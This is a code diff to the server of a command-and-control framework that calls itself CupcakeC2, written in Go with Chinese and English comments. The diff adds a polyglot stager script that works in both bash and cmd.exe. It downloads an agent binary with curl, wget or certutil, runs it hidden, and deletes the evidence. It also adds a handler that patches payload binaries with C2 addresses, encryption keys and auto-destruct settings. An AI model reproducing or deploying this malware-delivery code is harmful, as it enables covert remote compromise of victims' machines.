@@ -110,7 +110,6 @@ func HandleGenerate(c *gin.Context) {
 				templateName += "_arm64"
 			}
 		}
-		
 		templatePath := filepath.Join("assets", templateName)
 		raw, err := os.ReadFile(templatePath)
 		if err != nil {
@@ -322,8 +321,8 @@ func HandleGetStager(c *gin.Context) {
 		StagerCache.Store(id64, StagerConfig{OS: "windows", Arch: "x64", ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})
 		StagerCache.Store(id32, StagerConfig{OS: "windows", Arch: "x86", ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})
 
-		url64 := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id64)
-		url32 := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id32)
+		url64 := fmt.Sprintf("%s://%s/api/s/bin/%s", protocol, serverHost, id64)
+		url32 := fmt.Sprintf("%s://%s/api/s/bin/%s", protocol, serverHost, id32)
 
 		// bat 脚本：自动检测架构，下载对应版本并执行
 		command := fmt.Sprintf("certutil.exe -urlcache -split -f %s C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat", 
@@ -380,7 +379,65 @@ del /f /q "%%~f0" >nul 2>&1
 		return
 	}
 
-	// 🚀 Auto-detect target OS from User-Agent if set to "auto"
+	// Build the binary download URL from the current request
+	protocol := "http"
+	if c.Request.TLS != nil {
+		protocol = "https"
+	}
+	binaryURL := fmt.Sprintf("%s://%s/api/s/bin/%s", protocol, c.Request.Host, id)
+
+	// Craft a polyglot script: works in both bash/sh and Windows cmd.exe.
+	// The first line is a valid trick:
+	//   - In bash: '#" starts a comment → entire line ignored
+	//   - In cmd.exe: '#!' is not a command → error hidden by '2>nul',
+	//     then '@echo off & goto :BAT_START' jumps past the bash section
+	script := fmt.Sprintf(`#!/bin/sh 2>nul & @echo off & goto :BAT_START
+
+# [CupcakeC2] Universal Stager — self-detects bash vs cmd.exe
+# Binary download URL (embedded at build time):
+#   %s
+
+# ---- BASH / POSIX SHELL -------------------------------------------------
+if command -v curl >/dev/null 2>&1; then
+    curl -fsSL -m300 "%s" -o /tmp/.cupcake 2>/dev/null
+elif command -v wget >/dev/null 2>&1; then
+    wget -T300 -q "%s" -O /tmp/.cupcake 2>/dev/null
+fi
+if [ -f /tmp/.cupcake ] && [ -s /tmp/.cupcake ]; then
+    chmod +x /tmp/.cupcake 2>/dev/null
+    nohup /tmp/.cupcake >/dev/null 2>&1 &
+    sleep 1 2>/dev/null
+    rm -f /tmp/.cupcake 2>/dev/null
+fi
+exit 0
+
+# ---- WINDOWS CMD.EXE ----------------------------------------------------
+:BAT_START
+@echo off
+certutil.exe -urlcache -split -f "%s" %%TEMP%%\svc.exe >nul 2>&1
+if exist %%TEMP%%\svc.exe (
+    start /b %%TEMP%%\svc.exe
+    del /f /q "%%~f0" >nul 2>&1
+)
+exit /b 0
+`, binaryURL, binaryURL, binaryURL, binaryURL)
+
+	c.Data(200, "application/octet-stream", []byte(script))
+}
+
+// HandleServeRawPayload serves the raw patched binary (no script wrapping).
+// Used internally by the polyglot script at /api/s/:id and by the
+// Windows BAT stager at /api/s/bin/:id.
+func HandleServeRawPayload(c *gin.Context) {
+	id := c.Param("id")
+	val, ok := StagerCache.Load(id)
+	if !ok {
+		c.Data(404, "text/plain", []byte("Not found"))
+		return
+	}
+	conf := val.(StagerConfig)
+
+	// Auto-detect target OS from User-Agent if set to "auto"
 	targetOS := conf.OS
 	if targetOS == "" || targetOS == "auto" {
 		ua := strings.ToLower(c.Request.UserAgent())
@@ -414,6 +471,13 @@ del /f /q "%%~f0" >nul 2>&1
 		default:
 			templateName = "client_template_windows.exe"
 		}
+		// 🐛 Windows x86 特殊处理（仅 WS 协议有 x86 模板）
+		if conf.Arch == "x86" || conf.Arch == "i386" {
+			x86Name := strings.Replace(templateName, ".exe", "_x86.exe", 1)
+			if _, err := os.Stat(filepath.Join("assets", x86Name)); err == nil {
+				templateName = x86Name
+			}
+		}
 	} else {
 		switch strings.ToUpper(ln.Protocol) {
 		case "WS":
@@ -435,7 +499,7 @@ del /f /q "%%~f0" >nul 2>&1
 	templatePath := filepath.Join("assets", templateName)
 	raw, err := os.ReadFile(templatePath)
 	if err != nil {
-		c.Data(500, "text/plain", []byte("Template not found: " + templateName))
+		c.Data(500, "text/plain", []byte("Template not found: "+templateName))
 		return
 	}
 
@@ -451,7 +515,6 @@ del /f /q "%%~f0" >nul 2>&1
 	case "TCP":
 		c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
 	case "BIND-TCP", "正向TCP":
-		// Bind 模式下，Agent 在受害端监听
 		c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
 	case "DNS":
 		c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
@@ -461,7 +524,7 @@ del /f /q "%%~f0" >nul 2>&1
 
 	patched, err := services.PatchPayload(raw, c2url, ln.EncryptKey, ln.HeartbeatInterval, ln.HeartbeatJitter, "", conf.AutoDestruct, conf.SleepTime, ln.EncryptionSalt, ln.ObfuscateMode)
 	if err != nil {
-		c.Data(500, "text/plain", []byte("Patch failed: " + err.Error()))
+		c.Data(500, "text/plain", []byte("Patch failed: "+err.Error()))
 		return
 	}
 
